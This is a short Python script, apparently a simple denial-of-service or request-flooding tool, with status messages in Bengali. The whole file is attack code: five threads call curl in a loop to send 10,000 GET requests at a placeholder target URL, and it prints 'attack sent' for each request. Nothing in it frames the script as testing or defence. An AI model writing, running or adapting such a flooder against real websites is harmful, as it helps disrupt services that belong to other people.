import subprocess
import threading
import time

def attack(url, total_requests):
    for _ in range(total_requests):
        try:
            subprocess.run(["curl", "-X", "GET", url])
            print(f"🔥 {url} এ অ্যাটাক পাঠানো হয়েছে")
            time.sleep(0.5)
        except Exception as e:
            print(f"❌ ব্যর্থ: {e}")

def start_attack(url, total_requests, threads):
    thread_list = []
    for _ in range(threads):
        thread = threading.Thread(target=attack, args=(url, total_requests // threads))
        thread_list.append(thread)
        thread.start()
    
    for thread in thread_list:
        thread.join()

if __name__ == "__main__":
    target_url = "https://target-website.com"
    total_requests = 10000
    threads = 5
    start_attack(target_url, total_requests, threads)
